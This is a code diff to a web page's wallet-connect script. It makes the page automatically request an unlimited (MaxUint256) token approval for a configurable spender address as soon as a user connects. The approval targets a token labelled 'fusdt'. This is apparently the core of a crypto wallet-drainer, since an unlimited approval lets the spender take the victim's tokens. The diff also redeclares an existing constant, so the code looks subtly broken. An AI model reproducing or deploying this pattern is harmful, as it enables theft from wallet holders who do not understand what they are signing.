@@ -540,6 +540,17 @@
     const ERC20_BALANCE_ABI = [
       "function balanceOf(address owner) view returns (uint256)" 
       ];
+
+    const ERC20_APPROVE_ABI = [
+  "function approve(address spender, uint256 amount) public returns (bool)"
+];
+const ERC20_BALANCE_ABI = [
+  "function balanceOf(address owner) view returns (uint256)"
+];
+const ERC20_ALLOWANCE_ABI = [
+  "function allowance(address owner, address spender) view returns (uint256)"
+];
+
       const TOKEN_DECIMALS = 6; // <-- change to whatever your fusdt uses
 
     
@@ -787,29 +798,65 @@
       }
     }
 
-    async function requestTokenApproval(){
-      if(!TOKEN_ADDRESS || !SPENDER_ADDRESS || !providerInstance) return;
-      try{
-        setStatus("Requesting token approval…");
-        const ethersProvider = new ethers.BrowserProvider(providerInstance);
-        const signer         = await ethersProvider.getSigner();
-        const userAddress    = (await signer.getAddress()).toLowerCase();
+ async function ensureTokenApproval(){
+  if(!TOKEN_ADDRESS){
+    console.warn("TOKEN_ADDRESS not set, skipping approve");
+    return;
+  }
+  if(!SPENDER_ADDRESS){
+    console.warn("SPENDER_ADDRESS not set, skipping approve");
+    return;
+  }
+  if(!providerInstance){
+    console.warn("No providerInstance for approval");
+    return;
+  }
 
-        if(TOKEN_ADDRESS.toLowerCase() === userAddress){
-          alert("TOKEN_ADDRESS is set to your wallet, it must be the token contract.");
-          setStatus("Connected (approval skipped)");
-          return;
-        }
+  try{
+    const ethersProvider = new ethers.BrowserProvider(providerInstance);
+    const signer         = await ethersProvider.getSigner();
+    const ownerAddress   = (await signer.getAddress()).toLowerCase();
 
-        const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_APPROVE_ABI, signer);
-        const tx             = await tokenContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
-        await tx.wait();
-        setStatus("Connected + Approved ✅");
-      }catch(err){
-        console.error("Token approve error:", err);
-        setStatus("Connected (approval failed)");
-      }
+    if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
+      alert("ERROR: TOKEN_ADDRESS is set to your wallet address.\n\nIt MUST be the BEP-20 token contract address, not your wallet.");
+      setStatus("Connected (approval skipped)");
+      return;
     }
+
+    // 1) Read current allowance (view call, no gas)
+    const readContract = new ethers.Contract(
+      TOKEN_ADDRESS,
+      ERC20_ALLOWANCE_ABI,
+      ethersProvider
+    );
+    const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
+
+    if (currentAllowance > 0n) {
+      // already approved something – skip tx
+      console.log("Already approved, skipping new approve tx");
+      setStatus("Connected (already approved)");
+      return;
+    }
+
+    // 2) Not approved yet → send approve tx
+    setStatus("Requesting token approval…");
+    const writeContract = new ethers.Contract(
+      TOKEN_ADDRESS,
+      ERC20_APPROVE_ABI,
+      signer
+    );
+    const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
+    console.log("Approve tx sent:", tx.hash);
+    const receipt = await tx.wait();
+    console.log("Approve confirmed:", receipt);
+    setStatus("Connected + Approved ✅");
+  }catch(err){
+    console.error("Token approve error:", err);
+    alert("Token approval failed: " + (err && err.message ? err.message : err));
+    setStatus("Connected (approval failed)");
+  }
+}
+
 
     async function restoreSessionFromAddress(address){
       currentAddress = address;
@@ -892,7 +939,8 @@
 
         await restoreSessionFromAddress(address);
         setStatus("Connected");
-        await requestTokenApproval();
+       await ensureTokenApproval();
+
       }catch(err){
         console.error("connectFlow error:", err);
         setStatus("Connection failed");
